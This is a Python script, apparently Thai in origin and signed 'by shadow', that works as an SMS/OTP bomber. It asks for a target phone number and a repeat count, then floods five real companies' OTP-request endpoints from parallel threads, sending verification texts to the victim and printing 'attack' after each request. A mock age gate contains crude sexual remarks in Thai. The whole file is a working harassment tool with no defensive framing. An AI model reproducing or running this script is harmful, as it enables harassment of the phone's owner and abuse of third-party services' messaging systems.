import requests,json 
import os 
import time 
import threading 
from requests import get 
from re import search 
from requests import Session 
from threading import Thread 
os.system('clear') 
print("") 
print("""\033[1;96m
██╗░░░░░░█████╗░░██████╗░██╗███╗░░██╗
██║░░░░░██╔══██╗██╔════╝░██║████╗░██║
██║░░░░░██║░░██║██║░░██╗░██║██╔██╗██║
██║░░░░░██║░░██║██║░░╚██╗██║██║╚████║
███████╗╚█████╔╝╚██████╔╝██║██║░╚███║
╚══════╝░╚════╝░░╚═════╝░╚═╝╚═╝░░╚══╝\033[95m by shadow """) 
print ("")
name = input("\033[1;94mname :\033[1;93m ")
time.sleep(1) 
print("") 
password = input("\033[1;94mpass : \033[95m") 
time.sleep(1)
print("") 
old = int(input("\033[1;94mold : \033[1;96m")) 
time.sleep(1) 

if old>=12: 
	print ("")
	print("\033[92mโตแล้วนิ มีหมอยยัง") 
	time.sleep(2)
	os.system("clear")
	print ("")
	print ("\033[1;96mEH4404 by สคริปต์ หรรษา") 
	print ("")
	phone = input("\033[1;93mเบอร์ : \033[91m") 
	print ("")
	jam = int(input("\033[1;93mจำนวน : \033[1;94m")) 
	print ("")
	
	def api():
		requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value":phone,"country":"66"},"type":"mobile"})
		print ("\033[91mattack") 
		
	def api2():
		requests.post("https://store.boots.co.th/api/v1/guest/register/otp",json={"phone_number": phone})
		print ("\033[91mattack") 
		
	def api3():
		requests.post("https://api.zaapi.co/api/store/auth/otp/login",json={"phoneNumber":f"+66{phone}","namespace":"zaapi-buyers"},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})
		print ("\033[91mattack") 
		
	def api4():
		requests.post("https://u.icq.net/api/v65/rapi/auth/sendCode", json={"reqId":"39816-1633012470","params":{"phone": phone,"language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})
		print ("\033[91mattack") 
		
	def api5():
		requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
		print ("\033[91mattack") 
		
	for i in range(jam): 
		threading.Thread(target=api).start() 
		threading.Thread(target=api2).start() 
		threading.Thread(target=api3).start() 
		threading.Thread(target=api4).start() 
		threading.Thread(target=api5).start() 
    
else:
    print("\033[91mยังเด็กอยู่ หมอยยังไม่ขึ้นนิ")
    print ("")
    print ("\033[91mรอหมอยขึ้นก่อน ค่อยใช้")
    print ("")
    
